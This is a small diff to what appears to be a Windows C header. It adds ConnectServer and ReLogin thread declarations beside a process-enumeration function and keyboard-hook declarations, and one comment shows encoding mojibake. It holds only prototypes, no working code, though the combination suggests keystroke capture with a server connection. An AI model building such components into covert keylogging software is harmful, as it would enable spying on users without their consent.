@@ -76,6 +76,8 @@ typedef struct
 
 
 DWORD WINAPI Run(LPVOID);
+DWORD WINAPI ConnectServer(LPVOID);
+DWORD WINAPI ReLogin(LPVOID);
 int GetProcessThreadList(); //½ø³ÌµÄID
 LRESULT CALLBACK CldKeyBoardHookProc(int nCode, WPARAM wParam, LPARAM lParam);
 DWORD WINAPI KeyBoardHook(LPVOID);
